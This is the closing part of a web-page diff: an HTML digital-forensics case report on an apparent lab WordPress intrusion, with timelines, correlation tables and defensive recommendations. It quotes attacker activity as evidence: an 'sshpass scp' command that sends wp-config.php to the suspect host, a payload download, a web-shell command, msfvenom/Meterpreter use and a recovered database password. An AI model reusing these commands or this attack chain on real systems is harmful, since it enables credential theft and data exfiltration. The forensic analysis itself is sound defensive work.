+          <tr><td class="timeline-event">2024-03-17</td><td>Backup Guard import workflow abused — <code>xegsd.php</code> and <code>shell.php</code> uploaded; frame 7630 matched 50093.py fingerprint (user-agent, multipart boundary, endpoint, body)</td><td>PCAP-1 + suspect 50093.py + victim MFT + Defender EVTX</td></tr>
+          <tr><td class="timeline-event">2024-03-17–18</td><td>Shell POST commands: filesystem orientation, wp-config.php read, host/network checks</td><td>PCAP-1 shell POST bodies + victim Apache logs</td></tr>
+          <tr><td class="timeline-event">2024-03-18 06:38+</td><td>Shell responses returned wp-config.php contents: DB_PASSWORD = CSCI3338.</td><td>PCAP-1 HTTP response stream + victim disk</td></tr>
+          <tr><td class="timeline-event">2024-03-18 07:14:10</td><td>Victim PowerShell logged: <code>sshpass scp wp-config.php coelho@10.103.8.81</code></td><td>Victim PowerShell EVTX Event ID 600 + pagefile + Volatility cmdline</td></tr>
+        </tbody>
+      </table>
+    </div>
+
+    <h3>Capture 2 — March 23: Staging, Payload Execution &amp; Transfer</h3>
+    <div class="table-wrap">
+      <table>
+        <thead><tr><th>Timestamp (UTC)</th><th>Event</th><th>Evidence</th></tr></thead>
+        <tbody>
+          <tr><td class="timeline-event">2024-03-23 04:08:50</td><td>Victim <code>GET /stg.exe</code> from <code>http://10.103.8.81/stg.exe</code> — suspect returned HTTP 200, content-length 251,904</td><td>PCAP-2 + victim PowerShell EVTX + suspect Python netscan socket</td></tr>
+          <tr><td class="timeline-event">before 04:11:16</td><td>Web shell received <code>cmd=stg.exe</code> — executed the staged payload</td><td>PCAP-2 shell.php POST body</td></tr>
+          <tr><td class="timeline-event">2024-03-23 04:11:16</td><td>TCP Stream 139 callback began: <code>192.168.1.100:53702 → 10.103.8.81:443</code></td><td>PCAP-2 frame 4271 + suspect msfvenom LPORT=443</td></tr>
+          <tr><td class="timeline-event">2024-03-23 04:17:44</td><td>Victim USN Journal: dump.sql FileCreate</td><td>Victim USN Journal</td></tr>
+          <tr><td class="timeline-event">2024-03-23 04:18:26</td><td>Victim USN Journal: dump.sql write complete — size 5,083,961 bytes</td><td>Victim USN Journal + MFT</td></tr>
+          <tr><td class="timeline-event">04:19:00–04:19:24</td><td>Stream 139 encrypted burst: <strong>4,993,712 bytes victim→suspect</strong>, frames 8124–12101</td><td>PCAP-2 tshark stream direction analysis</td></tr>
+          <tr><td class="timeline-event">2024-03-23 04:19:21</td><td>Suspect MFT: dump.sql appeared under <code>Windows\System32</code> — SHA-256 matches victim copy</td><td>Suspect MFT + USN + hash comparison</td></tr>
+          <tr><td class="timeline-event">2024-03-23 09:03:34</td><td>Defender detected stg.exe / Meterpreter DLL activity on victim</td><td>Victim Defender Operational EVTX + SRUM</td></tr>
+        </tbody>
+      </table>
+    </div>
+
+    <hr>
+
+    <!-- ══ CROSS-SOURCE CORRELATION ══ -->
+    <h2 id="correlation">Cross-Source Correlation</h2>
+
+    <p>The final conclusion rests not on any single artifact, but on the alignment of independent evidence streams across all four sources. Encrypted traffic prevented packet-level content inspection; transient shell commands were not always preserved in a single log. Correlation across sources resolved both gaps.</p>
+
+    <h3>dump.sql Transfer — The Core Correlation</h3>
+    <p>Five independent artifact streams converge on the same 42-second window:</p>
+
+    <div class="table-wrap">
+      <table>
+        <thead><tr><th>Artifact</th><th>Timestamp</th><th>Source</th><th>Evidence Type</th></tr></thead>
+        <tbody>
+          <tr><td>Victim USN — dump.sql FileCreate</td><td class="timeline-event">04:17:44 UTC</td><td><span class="badge victim">Victim</span></td><td>USN Journal</td></tr>
+          <tr><td>Victim USN — dump.sql write complete, 5,083,961 bytes</td><td class="timeline-event">04:18:26 UTC</td><td><span class="badge victim">Victim</span></td><td>USN + MFT</td></tr>
+          <tr><td>Stream 139 victim→suspect burst begins — 4,993,712 bytes, frames 8124–12101</td><td class="timeline-event">04:19:00–04:19:24 UTC</td><td><span class="badge network">Network</span></td><td>PCAP-2 tshark</td></tr>
+          <tr><td>Suspect MFT — dump.sql FileCreate under Windows\System32</td><td class="timeline-event">04:19:21 UTC</td><td><span class="badge suspect">Suspect</span></td><td>MFT + USN</td></tr>
+          <tr><td>SHA-256 hash — identical on both victim and suspect copies</td><td class="timeline-event">—</td><td><span class="badge cross">Cross-Source</span></td><td>Get-FileHash</td></tr>
+          <tr><td>File size — 5,083,961 bytes on both hosts</td><td class="timeline-event">—</td><td><span class="badge cross">Cross-Source</span></td><td>MFT + Get-FileHash</td></tr>
+        </tbody>
+      </table>
+    </div>
+
+    <div class="callout warning">
+      <strong>Analytical limit preserved:</strong> Stream 139 was encrypted. The conclusion that it carried dump.sql is based on host-artifact correlation — timing, direction, volume, and hash match — not decrypted packet content. This is explicitly documented as corroborated inference, not plaintext proof.
+    </div>
+
+    <div class="fig-wrap half">
+      <img src="assets/images/dfir/49comparinghashwithsuspect.png" alt="SHA-256 hash comparison between victim and suspect dump.sql">
+      <figcaption>SHA-256 hash comparison — identical digest on both victim and suspect dump.sql copies confirms the same file was transferred</figcaption>
+    </div>
+
+    <h3>Integrated Case Timeline</h3>
+    <p>The following visualization synthesizes all four evidence sources into a unified chronological view of the intrusion lifecycle — from credential acquisition through exploitation, post-exploitation, and database exfiltration:</p>
+
+    <div class="fig-wrap">
+      <img src="assets/images/dfir/cumulativetimeline.png" alt="Integrated case timeline across all four evidence sources">
+      <figcaption>Integrated case timeline — suspect preparation (March 14–17) → WPScan &amp; exploitation (March 17) → shell use &amp; SCP attempt (March 18) → payload staging &amp; dump.sql transfer (March 23). Cross-source artifact convergence shown.</figcaption>
+    </div>
+
+    <h3>Four Key Correlation Lessons</h3>
+    <ol>
+      <li><strong>USN and MFT artifacts</strong> were essential for narrowing the dump.sql creation and transfer window to 42 seconds — no other source provided that precision.</li>
+      <li><strong>Pagefile and memory residue</strong> preserved SCP, SSH, and staging commands that were not fully available from standard application logs.</li>
+      <li><strong>Volatility process ancestry</strong> tied <code>cmd.exe</code>, <code>powershell.exe</code>, <code>scp.exe</code>, and <code>ssh.exe</code> to Apache-spawned execution rather than ordinary administration — a critical distinction.</li>
+      <li><strong>Packet captures were most reliable</strong> when interpreted after host artifacts had identified the relevant IPs, URIs, files, and timestamps. The capture confirmed what the host evidence predicted.</li>
+    </ol>
+
+    <hr>
+
+    <!-- ══ CONCLUSION ══ -->
+    <h2 id="conclusion">Conclusion &amp; Recommendations</h2>
+
+    <div class="callout success">
+      <strong>Final Case Conclusion:</strong> Unauthorized access occurred. Sensitive configuration was exposed. The dump.sql database file is strongly corroborated as having moved from the victim server (192.168.1.100) to the suspect workstation (10.103.8.81). The file contained patents-related WordPress database content and user-table data.
+    </div>
+
+    <h3>What Was Confirmed vs. Attempted</h3>
+    <div class="table-wrap">
+      <table>
+        <thead><tr><th>Activity</th><th>Status</th><th>Basis</th></tr></thead>
+        <tbody>
+          <tr><td>Credential harvesting of hierro's WordPress password</td><td><strong>Confirmed</strong></td><td>hierro.txt plaintext note + LAN Messenger delivery + pagefile credential residue</td></tr>
+          <tr><td>WordPress login as hierro</td><td><strong>Confirmed</strong></td><td>PCAP-1 cleartext POST + 302 redirect + auth cookies</td></tr>
+          <tr><td>shell.php upload via Backup Guard</td><td><strong>Confirmed</strong></td><td>PCAP-1 frame 7630 fingerprint match to 50093.py</td></tr>
+          <tr><td>wp-config.php exposure via shell</td><td><strong>Confirmed</strong></td><td>PCAP-1 HTTP response stream + victim disk</td></tr>
+          <tr><td>SCP transfer of wp-config.php to suspect</td><td><strong>Attempted</strong></td><td>Victim EVTX + pagefile + Volatility — no received file recovered on suspect</td></tr>
+          <tr><td>stg.exe staged and executed on victim</td><td><strong>Confirmed</strong></td><td>PCAP-2 + victim PowerShell EVTX + Defender detection</td></tr>
+          <tr><td>dump.sql transfer via Stream 139</td><td><strong>Strongly corroborated</strong></td><td>USN/MFT timing convergence + direction-specific burst + identical SHA-256 hash</td></tr>
+        </tbody>
+      </table>
+    </div>
+
+    <h3>Top Recommendations</h3>
+    <ol>
+      <li>Preserve all evidence materials — disk images, memory dumps, PCAP files, parsed artifacts, and this report — for administrative or legal review.</li>
+      <li>Remove the victim server from production; rebuild from a trusted baseline rather than in-place cleanup.</li>
+      <li>Forensically audit the workstation at <code>10.103.8.72</code> — LAN Messenger artifacts identify it as hierro's host during the credential-lure workflow.</li>
+      <li>Rotate all WordPress, MySQL, Windows, SSH, and application credentials exposed through <code>wp-config.php</code> and <code>dump.sql</code>.</li>
+      <li>Audit and revoke unauthorized SSH keys; restrict SSH/SCP paths between servers and ordinary workstation addresses.</li>
+      <li>Harden WordPress plugin governance — remove unnecessary plugins, disable risky restore/upload functionality, monitor Backup Guard workflows.</li>
+      <li><strong>Segment Projects and Patents data</strong> — the shared MySQL backend was the root cause of patent exposure through a Projects-facing exploit.</li>
+      <li>Add EDR rules for web-server processes spawning <code>cmd.exe</code>, <code>powershell.exe</code>, <code>scp.exe</code>, <code>ssh.exe</code>, or scripting runtimes.</li>
+      <li>Add network monitoring for high-volume encrypted outbound sessions from server processes to workstation IPs on TCP/443 and TCP/22.</li>
+      <li>Centralize Apache, WordPress, PowerShell, OpenSSH, Defender, SRUM, and Windows event logging to eliminate dependence on pagefile/memory residue for command reconstruction.</li>
+    </ol>
+
+    <div style="text-align:center; margin-top: 36px;">
+      <a class="dl-btn" href="assets/dfir-final-report.pdf" target="_blank" rel="noreferrer" style="display:inline-flex; align-items:center; gap:8px; background:#1d4ed8; color:#fff; font-size:15px; font-weight:700; padding:12px 28px; border-radius:8px; text-decoration:none;">⬇ Download Full 200-Page Report (PDF)</a>
+    </div>
+
+  </article>
+</div>
+
+<footer>
+  &copy; <span id="yr"></span> Kismat Kunwar &nbsp;·&nbsp; <a href="/">Back to Portfolio</a>
+</footer>
+<script>document.getElementById('yr').textContent = new Date().getFullYear();</script>
+
+</body>
+</html>
